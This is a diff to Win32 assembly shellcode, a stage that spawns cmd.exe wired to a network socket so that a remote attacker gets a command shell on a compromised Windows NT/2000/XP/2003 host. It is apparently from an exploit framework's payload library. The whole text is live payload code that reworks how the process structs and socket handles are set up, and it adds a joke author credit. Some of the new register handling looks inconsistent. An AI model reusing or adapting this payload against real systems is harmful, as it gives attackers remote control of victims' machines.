@@ -1,6 +1,6 @@
 ;      Title:  Win32 cmd.exe shell stage for WSA sockets
 ;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
-;     Author:  hdm, spoonm
+;     Author:  hdm, spoonm, spoonm's sister
 
 [BITS 32]
 
@@ -16,45 +16,45 @@
 %macro STAGE_WSA_SHELL 1
   LSetCommand:
       push "CMD"
-      mov ebx, esp
+      mov esi, esp
   
   LCreateProcessStructs:
       xchg edi, edx       ; save edi to edx
-      xor eax,eax         ; overwrite with null
-      lea edi, [esp-84]   ; struct sizes
-      push byte 21        ; 21 * 4 = 84
-      pop ecx             ; set counter
-      
+
+      push byte 0x50      ; struct sizes
+      pop ecx
+      sub esp, ecx	  ; Allocate space
+      mov edi, esp
+      push byte 0x44	  ; First element in first struct.
+      mov ebx, esp	  ; beginning for first struct.
+
   LBZero:
-      rep stosd           ; overwrite with null
-      xchg edi, edx       ; restore edi
-      
+      xor eax,eax         ; overwrite with null
+      rep stosb           ; overwrite with null
+
   LCreateStructs:
-      sub esp, 84
-      mov byte [esp + 16], 68	    ; si.cb = sizeof(si) 
-      mov word [esp + 60], 0x0101 ; si.dwflags
-        
-      ; socket handles 
-      mov [esp + 16 + 56], edi
-      mov [esp + 16 + 60], edi
-      mov [esp + 16 + 64], edi
-    
-      lea eax, [esp + 16]	; si 
-      push esp			; pi 
-      push eax
-      push ecx
-      push ecx
-      push ecx
-        
-      inc ecx
-      push ecx
-      dec ecx
-        
-      push ecx
-      push ecx
-      push ebx
-      push ecx
-  
+      inc byte [ebx + 0x2c] ; si.dwflags
+      inc byte [ebx + 0x2d] ; si.dwflags
+
+      lea edi, [ebx + 0x38] ; 3 socket fd's need to be written here (last 3 elements of the struct)
+      mov	eax, edx    ; socket fd 
+      stosd
+      stosd
+      stosd
+; edi now points to the start of the second struct.
+
+      push	edi         ; second struct
+      push	ebx         ; first struct
+      push	ecx         ; NULL
+      push	ecx         ; NULL
+      push	ecx         ; NULL
+      push	byte 0x01
+      push	ecx         ; NULL
+      push	ecx         ; NULL
+      push	esi         ; "cmd" pointer
+      push	ecx         ; NULL
+
+      xchg	edx, edi    ; restore edi to socket fd.
   LCreateProcessA:
 %if %1 == 1
       push dword [ebp] ; kernel32.dll
@@ -73,8 +73,8 @@
       call [ebp + 4]
 %endif
 
-      push BYTE -1
-      push dword [esi]
+      push byte 0xff	; dwMilliseconds (infinite)
+      push dword [esi]	; Process Handle
 %if %1 == 1
       call eax
 %else
